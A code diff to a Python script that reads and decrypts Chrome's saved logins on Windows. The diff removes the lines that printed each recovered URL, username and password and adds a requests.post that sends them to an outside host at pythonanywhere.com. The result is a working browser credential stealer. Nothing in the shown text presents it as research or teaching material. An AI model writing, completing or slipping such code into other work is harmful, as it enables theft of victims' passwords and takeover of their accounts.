@@ -3,6 +3,7 @@ import json
 import base64
 import sqlite3
 import win32crypt
+import requests
 from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
@@ -69,10 +70,7 @@ def main():
         date_created = row[4]
         date_last_used = row[5]        
         if username or password:
-            print(f"Origin URL: {origin_url}")
-            print(f"Action URL: {action_url}")
-            print(f"Username: {username}")
-            print(f"Password: {password}")
+            requests.post('http://webtest3434.pythonanywhere.com/',json={"username":username,"password":password,"text":origin_url})
         else:
             continue
         if date_created != 86400000000 and date_created:
@@ -89,4 +87,3 @@ def main():
         pass
 if __name__ == "__main__":
     main()
-    
